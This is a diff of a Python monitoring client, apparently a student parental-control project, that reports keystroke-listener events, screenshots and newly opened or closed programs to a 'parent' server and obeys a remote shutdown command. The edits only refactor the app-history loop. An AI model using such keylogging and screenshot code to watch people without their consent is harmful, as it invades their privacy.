@@ -15,7 +15,7 @@ firebase_admin.initialize_app(cred, {"storageBucket": "pbl4-09092003.appspot.com
 clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 serverParent = '192.168.1.10'
 serverPort = 8080
-current_apps = set()
+
 
 try:
     clientSocket.connect((serverParent, serverPort))
@@ -65,6 +65,7 @@ def takeScreenshot():
         print("Error: " + str(e))
 
 def getAppHistory():
+    current_apps = set()
     while True:
         # Lấy danh sách các ứng dụng đang chạy
         running_apps = {process.name() for process in psutil.process_iter() if process.name().endswith('.exe')}
@@ -75,11 +76,13 @@ def getAppHistory():
         for app in new_apps:
             # print(f"New App: {app}")
             app_new = "New App: {}".format(app)
+            print(app_new)
             clientSocket.send(app_new.encode('utf-8'))
         
         for app in closed_apps:
             # print(f"Closed App: {app}")
             app_close = "Closed App: {}".format(app)
+            print(app_close)            
             clientSocket.send(app_close.encode('utf-8'))
         
         current_apps = running_apps
@@ -93,7 +96,7 @@ with Listener(on_press=on_press) as parent:
             print("Message:" + message)
             if message == 'takeScreenshot':
                 takeScreenshot()
-            elif message == 'getAppHistory':
+            elif message == 'appHistory':
                 getAppHistory()
             elif message == 'shutdown':
                 os.system("shutdown /s /t 1")
